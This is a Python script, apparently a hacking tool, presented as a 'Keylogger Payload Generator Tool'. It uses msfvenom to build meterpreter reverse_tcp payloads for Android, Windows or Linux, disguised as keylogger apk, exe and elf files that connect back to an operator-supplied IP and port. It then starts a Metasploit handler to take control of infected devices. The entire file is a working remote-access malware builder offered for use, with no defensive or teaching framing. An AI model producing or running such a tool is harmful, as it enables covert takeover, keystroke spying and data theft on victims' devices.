import os
import sys
import time
from tqdm import tqdm
from colorama import init, Fore

init(autoreset=True)  # Initialize colorama

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_logo():
    clear_screen()
    print(Fore.RED + '''

        ██████╗░ █████╗ ███████╗████████╗██████╗░░██████╗░███████╗██████╗ ██╗   ██╗
        ██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗██╔════╝██╔══██╗╚██╗ ██╔╝
        ██████╔╝███████║███████╗░░░██║░░░██████╔╝██║░░ ██║███████╗██████╔╝ ╚████╔╝
        ██╔══██╗██╔══██║╚════██║░░░██║░░░██╔══██╗██║   ██║╚════██║██╔═══╝   ╚██╔╝
        ██║  ██║██║░░██║███████║░░░██║░░░██║░░██║╚██████╔╝███████║██║        ██║
        ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝        ╚═╝
                       \033[1mразработано @ARTIST для INFLUXION\033[0m
    ''')
    print(Fore.GREEN + "=" * 100)

def create_payload_with_loading(payload_command, platform):
    print(Fore.GREEN + f"Creating {platform} Payload...")
    for _ in tqdm(range(10), desc="Generating", ncols=100, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}"):
        time.sleep(0.1)
    os.system(payload_command)
    print(Fore.GREEN + f"{platform} Payload has been generated.")

def start_listener(ip, port):
    print(Fore.GREEN + "Starting Metasploit Listener...")
    os.system(f"msfconsole -q -x 'use exploit/multi/handler; set payload meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; run'")

def validate_ip(ip):
    # Basic validation for IP format
    if not ip.replace('.', '').isdigit() or ip.count('.') != 3:
        return False
    return True

def validate_port(port):
    try:
        port = int(port)
        if 1 <= port <= 65535:
            return True
        return False
    except ValueError:
        return False

def main():
    display_logo()

    print(Fore.BLUE + "                  Welcome to the Keylogger Payload Generator Tool!")
    print()  # Empty line for spacing
    print("Please select the platform for the payload creation:")
    print("1. Android")
    print("2. Windows")
    print("3. Linux")

    choice = input("Enter your choice (1/2/3): ")

    ip = input("Enter your IP address: ")
    port = input("Enter the port number: ")

    if not validate_ip(ip):
        print(Fore.RED + "Invalid IP address. Please try again.")
        return
    if not validate_port(port):
        print(Fore.RED + "Invalid port number. Please enter a valid port (1-65535).")
        return

    if choice == "1":
        platform = "Android"
        payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o android_keylogger.apk"
        create_payload_with_loading(payload_command, platform)
    elif choice == "2":
        platform = "Windows"
        payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o windows_keylogger.exe"
        create_payload_with_loading(payload_command, platform)
    elif choice == "3":
        platform = "Linux"
        payload_command = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o linux_keylogger.elf"
        create_payload_with_loading(payload_command, platform)
    else:
        print(Fore.RED + "Invalid choice. Please try again.")
        return

    start_listener(ip, port)

if __name__ == "__main__":
    main()
